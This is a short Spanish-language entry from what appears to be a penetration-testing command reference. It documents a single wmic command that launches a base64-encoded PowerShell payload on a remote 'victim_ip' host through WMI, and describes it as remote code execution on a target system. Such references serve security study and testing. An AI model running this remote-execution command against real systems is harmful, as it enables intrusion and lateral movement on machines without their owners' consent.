---
id: comando-168
tipo: comando
fecha_actualizacion: 2026-05-11T15:57:22.625393
---

# wmic /node:"victim_ip" process call create "powershell.exe -enc base64

**SO:** windows
**Herramienta:** wmic

```bash
wmic /node:"victim_ip" process call create "powershell.exe -enc base64_encoded_payload"
```

Ejecuta código remoto en un sistema objetivo mediante WMI

**Flags:** `/node`

## Entidades relacionadas

[[f1dc542f-0b86-462c-ac95-48b4e97cbf33]]
[[WMIC]]
